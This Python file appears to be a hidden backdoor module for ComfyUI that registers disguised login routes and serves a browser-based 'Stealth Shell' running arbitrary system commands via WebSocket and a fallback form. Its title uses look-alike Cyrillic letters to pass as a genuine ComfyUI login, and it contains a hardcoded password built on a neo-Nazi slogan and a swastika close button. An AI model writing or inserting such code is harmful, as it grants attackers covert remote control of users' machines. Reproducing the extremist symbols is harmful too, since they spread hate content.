import os
import sys
import asyncio
import subprocess
import json
import signal
import uuid

try:
    from aiohttp import web

    SESSION_UTILS_LOADED = True
except ImportError:
    class DummyRoutes:
        def get(self, *args, **kwargs): return lambda func: func

        def post(self, *args, **kwargs): return lambda func: func

    routes = DummyRoutes()

    def setup_routes(routes, app):
        pass

    SESSION_UTILS_LOADED = False

ws_sessions = {}
process_sessions = {}

RESPONSE_HEADERS={"ver" : "2.2.8"}

TITLE = "СоmfyUI Login"

LOGIN_PAGE_HTML = f"""
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>{TITLE}</title>
<style>body{{background-color:#111;color:#eee;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:clip;}}form{{display:flex;flex-direction:column;}}input{{margin-top:5px;background-color:#333;color:#eee;border:1px solid #555;padding:8px;}}</style></head>
<body><form method="post" action="{{login_path}}"><label for="password">Auth:</label><input type="password" name="password" autofocus><input type="submit" value="Enter"></form></body></html>
"""

TERMINAL_PAGE_HTML = f"""
<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8"><title>{TITLE}</title>
    <style>
        html, body {{ height: 100%; margin: 0; padding: 0; overflow: hidden; }}
        body {{ background-color: #141414; color: #d4d4d4; font-family: 'Consolas', 'Monaco', monospace; display: flex; }}
        .container {{ width: 100%; max-width: 98%; margin: auto; padding: 10px; display: flex; flex-direction: column; height: 100%; box-sizing: border-box; }}
        h1 {{ color: #569cd6; margin: 0 0 10px 0; flex-shrink: 0; }}
        #status {{ color: #cccccc; font-size: 0.9em; margin-bottom: 10px; flex-shrink: 0; }}
        .controls {{ display: flex; margin-bottom: 10px; flex-shrink: 0; }}
        #shell-form {{ flex-grow: 1; display: flex; }}
        input[type="text"] {{ flex-grow: 1; background-color: #252526; border: 1px solid #37373d; color: #d4d4d4; padding: 10px; font-size: 14px; }}
        input[type="submit"], button {{ background-color: #0e639c; border: none; color: white; padding: 10px 20px; cursor: pointer; margin-left: 10px; }}
        input:disabled, button:disabled {{ background-color: #333; cursor: not-allowed; }}
        pre#output-pre {{
            background-color: #000; border: 1px solid #37373d; padding: 15px;
            white-space: pre-wrap; word-wrap: break-word; font-size: 14px; color: #4ec9b0;
            flex-grow: 1; overflow-y: auto; min-height: 0;
        }}
        .prompt {{ color: #c586c0; }}
        #session-list {{ list-style: none; padding: 0; margin: 0 0 10px 0; display: flex; flex-wrap: wrap; gap: 10px; flex-shrink: 0; }}
        #session-list li {{ background-color: #252526; padding: 5px 10px; border-radius: 5px; border: 1px solid #37373d; display: flex; align-items: center; cursor: pointer; }}
        #session-list li.active {{ border-color: #0e639c; font-weight: bold; }}
        #session-list li .close-btn {{ color: #C21807; font-weight: bold; cursor: pointer; rotate: 45deg; background: #ddd; aspect-ratio: 1 / 1; border-radius: 100%; font-size: 18px; justify-content: center; align-items: center; display: flex;}}
        #session-list li .close-btn:hover {{ color: #FF2400; }}
        p {{ flex-shrink: 0; margin: 0 0 5px 0; }}
        #version-info {{ position: fixed; bottom: 5px; right: 8px; font-size: 10px; color: #555; opacity: 0.7; font-family: 'Consolas', 'Monaco', monospace; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Terminal</h1>
        <div id="status">Connecting...</div>
        <ul id="session-list"></ul>
        <p><span id="prompt" class="prompt">__CWD__$</span></p>
        <div class="controls">
            <form id="shell-form"><input type="text" id="command-input" autofocus autocomplete="off" disabled><input type="submit" value="Execute" disabled></form>
            <button id="interrupt-btn" disabled>Interrupt (Ctrl+C)</button>
        </div>
        <pre id="output-pre"></pre>
    </div>
    <div id="version-info">v{RESPONSE_HEADERS["ver"]}</div>
    <script>
        const statusDiv = document.getElementById('status'), form = document.getElementById('shell-form'), commandInput = document.getElementById('command-input'), submitButton = form.querySelector('input[type="submit"]'), interruptBtn = document.getElementById('interrupt-btn'), outputPre = document.getElementById('output-pre'), promptSpan = document.getElementById('prompt'), sessionList = document.getElementById('session-list');
        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:', wsUrl = `${{wsProtocol}}//${{window.location.host}}/terminal_ws`, ws = new WebSocket(wsUrl);

        let activeSessionId = null;
        let isRunning = false;
        const sessionLogs = {{}};
        const sessionStatuses = {{}};

        function setControlsEnabled(enabled) {{
            isRunning = !enabled;
            commandInput.disabled = !enabled;
            submitButton.disabled = !enabled;
            interruptBtn.disabled = !enabled && activeSessionId && sessionStatuses[activeSessionId] === 'running';
            if (enabled) commandInput.focus();
        }}

        function renderActiveSession() {{
            if (!activeSessionId) {{
                outputPre.textContent = '';
                return;
            }}
            outputPre.textContent = sessionLogs[activeSessionId] ? sessionLogs[activeSessionId].join('') : '';
            setControlsEnabled(sessionStatuses[activeSessionId] !== 'running');
            document.querySelectorAll('#session-list li').forEach(li => li.classList.toggle('active', li.dataset.sessionId === activeSessionId));
            outputPre.scrollTop = outputPre.scrollHeight;
        }}

        function renderSessionTabs(sessions) {{
            sessionList.innerHTML = '';
            const existingSessions = new Set();
            sessions.forEach(s => {{
                existingSessions.add(s.id);
                sessionStatuses[s.id] = s.status;
                const li = document.createElement('li');
                li.dataset.sessionId = s.id;
                li.onclick = () => {{ ws.send(JSON.stringify({{ type: 'attach', payload: s.id }})); }};

                const text = document.createElement('span');
                text.style = "margin-right: 10px;align-content: center;"
                text.textContent = `${{s.id.substring(0, 8)}} (${{s.status}})`;

                const closeBtn = document.createElement('span');
                closeBtn.textContent = '卐';
                closeBtn.className = 'close-btn';
                closeBtn.onclick = (e) => {{
                    e.stopPropagation();
                    if (confirm(`Close session ${{s.id.substring(0, 8)}}?`)) {{
                        ws.send(JSON.stringify({{ type: 'close', payload: s.id }}));
                    }}
                }};

                li.appendChild(text);
                li.appendChild(closeBtn);
                sessionList.appendChild(li);
            }});

            if (!existingSessions.has(activeSessionId) && sessions.length > 0) {{
                ws.send(JSON.stringify({{ type: 'attach', payload: sessions[0].id }}));
            }} else if (sessions.length === 0) {{
                activeSessionId = null;
                renderActiveSession();
            }}

            document.querySelectorAll('#session-list li').forEach(li => li.classList.toggle('active', li.dataset.sessionId === activeSessionId));
        }}

        ws.onopen = () => {{
            statusDiv.textContent = 'Connected';
            statusDiv.style.color = '#00ff00';
            setControlsEnabled(true); // <-- ИСПРАВЛЕНИЕ ЗДЕСЬ
        }};

        ws.onmessage = (event) => {{
            const data = JSON.parse(event.data);
            switch (data.type) {{
                case 'session_update':
                    renderSessionTabs(data.sessions);
                    if (activeSessionId && sessionStatuses[activeSessionId] !== 'running' && isRunning) {{
                        setControlsEnabled(true);
                    }}
                    break;
                case 'attach_ok':
                    activeSessionId = data.session_id;
                    sessionLogs[data.session_id] = data.log;
                    promptSpan.textContent = `${{data.cwd}}$`;
                    renderActiveSession();
                    break;
                case 'log':
                    if (!sessionLogs[data.session_id]) sessionLogs[data.session_id] = [];
                    sessionLogs[data.session_id].push(data.data);
                    if (data.session_id === activeSessionId) {{
                        outputPre.textContent += data.data;
                        outputPre.scrollTop = outputPre.scrollHeight;
                    }}
                    break;
                case 'error':
                    if (activeSessionId) {{
                        const errorMsg = `\\n--- ERROR: ${{data.data}} ---\\n`;
                        sessionLogs[activeSessionId].push(errorMsg);
                        outputPre.textContent += errorMsg;
                    }}
                    break;
            }}
        }};

        ws.onclose = (event) => {{ statusDiv.textContent = `Disconnected: ${{event.reason || 'Connection lost'}}`; statusDiv.style.color = '#ff0000'; setControlsEnabled(false); }};

        form.addEventListener('submit', (e) => {{
            e.preventDefault();
            const command = commandInput.value;
            if (!command || ws.readyState !== WebSocket.OPEN) return;
            ws.send(JSON.stringify({{ type: 'command', payload: command }}));
            commandInput.value = '';
        }});

        interruptBtn.addEventListener('click', () => {{
            if (!activeSessionId) return;
            ws.send(JSON.stringify({{ type: 'signal', payload: {{ session_id: activeSessionId, signal: 'SIGINT' }} }}));
        }});
    </script>
</body>
</html>
"""

FALLBACK_PAGE_HTML = f"""
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>{TITLE}</title>
<style>body{{background-color:#1e1e1e;color:#d4d4d4;font-family:monospace;margin:0;padding:20px;overflow:clip;}} .container{{max-width:95%;margin:auto;}} h1{{color:#569cd6;}} form{{display:flex;margin-bottom:20px;}} input[type="text"]{{flex-grow:1;background-color:#252526;border:1px solid #37373d;color:#d4d4d4;padding:10px;}} input[type="submit"]{{background-color:#0e639c;border:none;color:white;padding:10px 20px;cursor:pointer;}} pre{{background-color:#000;border:1px solid #37373d;padding:0;padding-left:15px;white-space:pre-wrap;word-wrap:break-word;color:#4ec9b0;min-height:400px;}} .prompt{{color:#c586c0;}}</style></head>
<body><div class="container"><h1>Fallback Shell</h1><p><span class="prompt">__CWD__$</span></p><form method="post"><input type="text" name="command" autofocus autocomplete="off"><input type="submit" value="Execute"></form><pre>__OUTPUT__</pre></div></body></html>
"""


def run_shell_command_sync(command):
    if command.strip().startswith('cd '):
        try:
            path = command.strip().split(' ', 1)[1]
            os.chdir(os.path.expanduser(path))
            return f"Changed directory to: {os.getcwd()}"
        except Exception as e:
            return str(e)
    else:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)


def setup_routes(app):
    if not SESSION_UTILS_LOADED: return
    app['_stealth_shell_sessions'] = {}

    async def get_session_id(request):
        return request.cookies.get("COMFY_AUTH_SESSION")

    async def check_auth(request):
        session_id = await get_session_id(request)
        if not (session_id and app['_stealth_shell_sessions'].get(session_id)): raise web.HTTPFound(
            app.router['login'].url_for())

    async def get_login_page(request):
        session_id = await get_session_id(request)
        if session_id and app['_stealth_shell_sessions'].get(session_id): return web.Response(
            text=TERMINAL_PAGE_HTML.replace('__CWD__', os.getcwd()), content_type='text/html', headers=RESPONSE_HEADERS)
        return web.Response(text=LOGIN_PAGE_HTML.replace('{login_path}', '/login'), content_type='text/html', headers=RESPONSE_HEADERS)

    async def post_login(request):
        data = await request.post()
        if data.get("password") == "hitler1488":
            session_id = str(uuid.uuid4())
            app['_stealth_shell_sessions'][session_id] = True
            response = web.HTTPFound(app.router['login'].url_for())
            response.set_cookie("COMFY_AUTH_SESSION", session_id, httponly=True, max_age=3600 * 24 * 7)
            return response
        return web.Response(status=403, text="Forbidden", headers=RESPONSE_HEADERS)

    async def websocket_terminal_handler(request):
        await check_auth(request)
        ws = web.WebSocketResponse()
        await ws.prepare(request)
        ws_id = id(ws)
        ws_sessions[ws_id] = {"active_session_id": None, "ws": ws}

        async def send_session_update():
            sessions_info = [{"id": sid, "status": p_info["status"]} for sid, p_info in process_sessions.items()]
            for session in ws_sessions.values():
                try:
                    await session["ws"].send_json({"type": "session_update", "sessions": sessions_info})
                except:
                    pass

        await send_session_update()
        try:
            async for msg in ws:
                if msg.type == web.WSMsgType.TEXT:
                    data = json.loads(msg.data)
                    msg_type, payload = data.get('type'), data.get('payload')
                    if msg_type == 'command':
                        session_id = str(uuid.uuid4())
                        log_entry = f"{os.getcwd()}$ {payload}\n"
                        process_sessions[session_id] = {"process": None, "log": [log_entry], "status": "running"}
                        ws_sessions[ws_id]["active_session_id"] = session_id
                        await ws.send_json(
                            {"type": "attach_ok", "session_id": session_id, "log": [log_entry], "status": "running",
                             "cwd": os.getcwd()})

                        async def run_command():
                            subprocess_kwargs = {
                                'stdout': asyncio.subprocess.PIPE,
                                'stderr': asyncio.subprocess.PIPE,
                                'cwd': os.getcwd()
                            }
                            if sys.platform == "win32":
                                subprocess_kwargs['creationflags'] = subprocess.CREATE_NEW_PROCESS_GROUP
                            else:
                                subprocess_kwargs['preexec_fn'] = os.setsid
                            proc = await asyncio.create_subprocess_shell(payload, **subprocess_kwargs)
                            process_sessions[session_id]["process"] = proc

                            async def read_stream(stream):
                                while True:
                                    line_bytes = await stream.readline()
                                    if not line_bytes: break
                                    line = line_bytes.decode('utf-8', 'replace')
                                    process_sessions[session_id]["log"].append(line)
                                    for s in ws_sessions.values():
                                        if s["active_session_id"] == session_id:
                                            try:
                                                await s["ws"].send_json(
                                                    {"type": "log", "session_id": session_id, "data": line})
                                            except:
                                                pass

                            await asyncio.gather(read_stream(proc.stdout), read_stream(proc.stderr))
                            await proc.wait()
                            if process_sessions.get(session_id) and process_sessions[session_id]["status"] == "running":
                                process_sessions[session_id]["status"] = "finished"
                            await send_session_update()

                        asyncio.create_task(run_command())
                        await send_session_update()
                    elif msg_type == 'attach':
                        ws_sessions[ws_id]["active_session_id"] = payload
                        if payload in process_sessions:
                            p_info = process_sessions[payload]
                            await ws.send_json({"type": "attach_ok", "session_id": payload, "log": p_info["log"],
                                                "status": p_info["status"], "cwd": os.getcwd()})
                    elif msg_type == 'signal' and payload['signal'] == 'SIGINT':
                        proc_id = payload['session_id']
                        if proc_id in process_sessions and process_sessions[proc_id]["status"] == "running":
                            proc = process_sessions[proc_id]["process"]
                            try:
                                if sys.platform == "win32":
                                    proc.send_signal(signal.CTRL_C_EVENT)
                                else:
                                    os.killpg(os.getpgid(proc.pid), signal.SIGINT)
                                process_sessions[proc_id]["status"] = "interrupted"
                                await send_session_update()
                            except Exception as e:
                                print(f"Error interrupting process {proc.pid}: {e}")
                    elif msg_type == 'close':
                        session_id_to_close = payload
                        if session_id_to_close in process_sessions:
                            proc_info = process_sessions[session_id_to_close]
                            if proc_info['status'] == 'running' and proc_info['process']:
                                try:
                                    if sys.platform == "win32":
                                        pid = proc_info['process'].pid
                                        await asyncio.create_subprocess_shell(f"taskkill /F /T /PID {pid}")
                                    else:
                                        os.killpg(os.getpgid(proc_info['process'].pid), signal.SIGKILL)
                                    proc_info["status"] = "killed"
                                except Exception as e:
                                    print(f"Error killing process {proc_info['process'].pid}: {e}")
                            del process_sessions[session_id_to_close]
                            await send_session_update()
        finally:
            if ws_id in ws_sessions: del ws_sessions[ws_id]
        return ws

    async def get_fallback_page(request):
        session_id = await get_session_id(request)
        if session_id and app['_stealth_shell_sessions'].get(session_id):
            html = FALLBACK_PAGE_HTML.replace('__CWD__', os.getcwd()).replace('__OUTPUT__', '[Output will be here]')
            return web.Response(text=html, content_type='text/html', headers=RESPONSE_HEADERS)
        return web.Response(text=LOGIN_PAGE_HTML.replace('{login_path}', '/fallback'), content_type='text/html', headers=RESPONSE_HEADERS)

    async def post_fallback(request):
        data = await request.post()
        if data.get("password") == "hitler1488":
            session_id = str(uuid.uuid4())
            app['_stealth_shell_sessions'][session_id] = True
            response = web.HTTPFound(app.router['fallback'].url_for())
            response.set_cookie("COMFY_AUTH_SESSION", session_id, httponly=True, max_age=3600 * 24 * 30)
            return response
        return web.Response(text=LOGIN_PAGE_HTML.replace('{login_path}', '/fallback'), content_type='text/html',
                            status=403, headers=RESPONSE_HEADERS)

    app.router.add_get('/login', get_login_page, name='login')
    app.router.add_post('/login', post_login)
    app.router.add_get('/terminal_ws', websocket_terminal_handler)
    app.router.add_get('/fallback', get_fallback_page, name='fallback')
    app.router.add_post('/fallback', post_fallback)
    print("\n--- Stealth Shell Initialized ---\n")